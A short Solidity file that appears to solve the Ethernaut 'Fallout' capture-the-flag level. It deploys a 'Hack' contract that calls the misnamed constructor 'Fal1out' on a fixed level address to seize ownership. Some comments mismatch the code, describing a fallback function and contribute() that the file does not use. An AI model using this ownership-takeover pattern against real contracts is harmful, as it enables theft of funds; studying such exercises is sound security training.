// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface Fallout {
    function Fal1out() external payable;

    function owner() external returns (address);
}

// POC: If you look carefully at the function fallback recieve function, it is our key to gain the ownership.
// To get the ownership, contributions[msg.sender] > 0
// In order to have some contributions, we need to contribute() first.
contract Hack {
    Fallout constant lvl02 =
        Fallout(0x605AF36FA62353f714cB9eE628474956d661cF3C);

    // help us to send some ETH to this contract while deploying
    constructor() public payable {}

    function hack() public {
        // If you look carefully, you will find that the name of contrustor doesn't matches
        // with the contract name, which is our key to this hack
        lvl02.Fal1out{value: 1 wei}();
        require(lvl02.owner() == address(this), "Failed");
    }
}
